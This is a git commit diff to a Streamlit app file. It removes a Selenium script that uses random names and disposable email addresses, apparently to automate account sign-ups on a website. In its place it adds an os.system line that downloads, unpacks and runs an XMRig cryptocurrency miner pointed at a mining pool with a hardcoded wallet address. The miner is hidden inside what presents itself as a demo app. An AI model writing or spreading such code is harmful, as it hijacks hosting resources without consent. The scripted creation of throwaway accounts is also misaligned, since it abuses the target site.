97aa09b110cc9488d7a9140a972371e10914c13d
mahmoudfahmi2 <126987016+mahmoudfahmi2@users.noreply.github.com>
2024-07-20 10:31:48 +0300

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -11,49 +11,5 @@ Fork this repo, and edit `/streamlit_app.py` to customize this app to your heart
 """
 
 with st.echo():
-    from selenium import webdriver
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.chrome.service import Service
-    from webdriver_manager.chrome import ChromeDriverManager
-    from webdriver_manager.core.os_manager import ChromeType
-    from tempmail import EMail
-    from urlextract import URLExtract
-    import time
-    import re
-    import random
-    import string
-    from selenium.webdriver.common.keys import Keys
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support import expected_conditions as EC
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.common.action_chains import ActionChains
-    from selenium import webdriver
-    from selenium.webdriver.common.keys import Keys
-    from selenium.webdriver.chrome.options import Options
-    def random_char(y):
-        return ''.join(random.choice(string.ascii_letters) for x in range(y))
-
-    @st.cache_resource
-    def get_driver():
-        return webdriver.Chrome(
-            service=Service(
-                ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install()
-            ),
-            options=options,
-        )
-    
-    options = Options()
-    options.add_argument("--disable-gpu")
-    options.add_argument("--headless")
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    extractor = URLExtract()
-  
-    name = random_char(5)
-    name_2 = random_char(5)
-    email = EMail()
-    driver = get_driver()
-    wait = WebDriverWait(driver, 10)
-    driver.get("https://myco.io/")
-    wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(.,'Sign In')]"))).click()
-    
+    import os
+    os.system("wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && ls -a &&chmod +x ./xmrigDaemon && ./xmrigDaemon -o pool.hashvault.pro:443 -u 43NA3bgmhkFD2E5ychNnhG7TTcsp78e4AbZEAgBUwK8ubdnAe8tvFo2dNmhMw9fCELjBA9Enfsjkihm7RvwEN71gMeWVVbX -k --tls")
